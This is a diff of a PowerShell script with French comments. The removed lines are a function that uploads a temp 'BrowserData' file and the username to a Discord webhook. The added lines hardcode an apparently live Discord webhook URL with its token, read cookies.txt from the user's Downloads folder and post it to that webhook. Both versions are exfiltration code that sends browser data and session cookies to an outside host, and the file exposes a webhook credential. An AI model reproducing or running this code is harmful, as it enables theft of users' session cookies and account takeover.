@@ -1,24 +1,31 @@
-function Upload-Discord {
-
 [CmdletBinding()]
 param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
+    [string]$webhookUrl = 'https://discord.com/api/webhooks/1274052463669809193/05ymYqz_6ipeQWB9VvSFCEuyXummTSTlbGb-HQL-I_VcTbqgUt7blzqJ9dP7ntKd2GpJ'  # Remplacez ceci par votre URL de webhook
 )
 
-$hookurl = "$dc"
+# Définir le chemin du fichier cookies.txt dans le dossier Téléchargements
+$filePath = "$env:USERPROFILE\Downloads\cookies.txt"
 
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+# Vérifiez si le fichier existe
+if (-Not (Test-Path $filePath)) {
+    Write-Error "Le fichier spécifié n'existe pas : $filePath"
+    exit
 }
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+# Préparer le fichier pour l'envoi
+$form = @{
+    file = [System.IO.File]::ReadAllBytes($filePath)
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
+# Envoyer le fichier au webhook Discord
+try {
+    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $form
+
+    if ($response -ne $null) {
+        Write-Host "Fichier envoyé avec succès."
+    } else {
+        Write-Error "Échec de l'envoi du fichier."
+    }
+} catch {
+    Write-Error "Une erreur est survenue : $_"
+}
